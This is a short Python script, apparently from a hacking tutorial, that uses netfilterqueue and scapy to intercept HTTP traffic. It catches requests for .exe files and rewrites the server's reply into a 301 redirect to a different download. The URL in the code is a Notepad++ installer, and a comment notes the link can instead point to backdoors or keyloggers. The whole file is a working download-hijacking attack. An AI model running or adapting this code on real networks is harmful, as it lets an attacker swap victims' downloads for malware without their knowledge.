#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):

	packet[scapy.Raw].load = load
	# removing handshake, because we edited packets
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:
			# print("HTTP Request")
			if ".exe" in scapy_packet[scapy.Raw].load:
				print("[+] exe Request")
				ack_list.append(scapy_packet[scapy.TCP].ack)
			#	print(scapy_packet.show())
		elif scapy_packet[scapy.TCP].sport == 80:
			# print("HTTP Response")
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("[+] Replacing file")
			
			#	print(scapy_packet.show())
			# in this load line I can PUT anything I want( links for Backdoors, Keyloggers, any link to download a file)
				modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v7.9.5/npp.7.9.5.Installer.exe\n\n")			
				
				packet.set_payload(str(modified_packet))

	packet.accept()
	# packet.drop() - will not allow to use Internet - Blockes Internet

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
